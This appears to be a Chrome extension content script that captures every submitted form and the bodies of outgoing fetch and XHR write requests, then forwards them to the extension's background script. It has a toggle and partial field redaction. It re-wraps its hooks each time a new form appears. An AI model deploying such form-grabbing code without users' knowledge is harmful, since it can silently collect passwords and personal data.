class FormInterceptor {
  constructor() {
    this.isEnabled = true;
    this.init();
  }

  init() {
    // Listen for extension enable/disable messages
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
      if (request.type === 'TOGGLE_INTERCEPTION') {
        this.isEnabled = request.enabled;
        sendResponse({ success: true });
      }
    });

    // Intercept form submissions
    this.setupFormInterception();

    // Handle dynamic forms added later
    this.setupMutationObserver();
  }

  setupFormInterception() {
    document.addEventListener('submit', (e) => {
      if (!this.isEnabled) return;

      const form = e.target;
      this.captureFormSubmission(form);
    }, true);

    // Also capture XHR and Fetch requests that might be form data
    this.interceptFetchRequests();
    this.interceptXHRRequests();
  }

  captureFormSubmission(form) {
    try {
      const formData = new FormData(form);
      const capturedData = {
        timestamp: new Date().toISOString(),
        url: window.location.href,
        formId: form.id || 'unnamed',
        formName: form.name || 'unnamed',
        method: form.method?.toUpperCase() || 'POST',
        action: form.action || window.location.href,
        fields: this.extractFields(formData),
        userAgent: navigator.userAgent,
        pageTitle: document.title
      };

      // Send to background script
      chrome.runtime.sendMessage({
        type: 'FORM_SUBMITTED',
        data: capturedData
      });

    } catch (error) {
      console.error('Error capturing form:', error);
    }
  }

  extractFields(formData) {
    const fields = {};

    for (const [key, value] of formData.entries()) {
      // Skip excluded fields
      if (this.isExcludedField(key)) {
        fields[key] = '[REDACTED]';
        continue;
      }

      // Handle file inputs
      if (value instanceof File) {
        fields[key] = {
          type: 'file',
          name: value.name,
          size: value.size,
          mimeType: value.type
        };
      } else {
        fields[key] = value;
      }
    }

    return fields;
  }

  isExcludedField(fieldName) {
    const lowerName = fieldName.toLowerCase();
    return CONFIG.excludeFields.some(excluded => 
      lowerName.includes(excluded.toLowerCase())
    );
  }

  interceptFetchRequests() {
    const originalFetch = window.fetch;

    window.fetch = function(...args) {
      const [resource, config] = args;

      if (config && config.method && 
          ['POST', 'PUT', 'PATCH'].includes(config.method.toUpperCase())) {

        if (config.body && typeof config.body === 'string') {
          try {
            const capturedData = {
              timestamp: new Date().toISOString(),
              url: window.location.href,
              method: config.method,
              endpoint: resource,
              dataType: 'fetch',
              body: config.body,
              headers: config.headers || {},
              userAgent: navigator.userAgent
            };

            chrome.runtime.sendMessage({
              type: 'FETCH_INTERCEPTED',
              data: capturedData
            });
          } catch (e) {
            console.error('Fetch interception error:', e);
          }
        }
      }

      return originalFetch.apply(this, args);
    };
  }

  interceptXHRRequests() {
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
      this._interceptData = {
        method: method,
        url: url
      };
      return originalOpen.apply(this, [method, url, ...rest]);
    };

    XMLHttpRequest.prototype.send = function(body) {
      if (['POST', 'PUT', 'PATCH'].includes(this._interceptData.method?.toUpperCase())) {
        try {
          const capturedData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            method: this._interceptData.method,
            endpoint: this._interceptData.url,
            dataType: 'xhr',
            body: typeof body === 'string' ? body : JSON.stringify(body),
            userAgent: navigator.userAgent
          };

          chrome.runtime.sendMessage({
            type: 'XHR_INTERCEPTED',
            data: capturedData
          });
        } catch (e) {
          console.error('XHR interception error:', e);
        }
      }

      return originalSend.apply(this, [body]);
    };
  }

  setupMutationObserver() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeName === 'FORM') {
              // Re-attach listeners to new forms
              this.setupFormInterception();
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
}

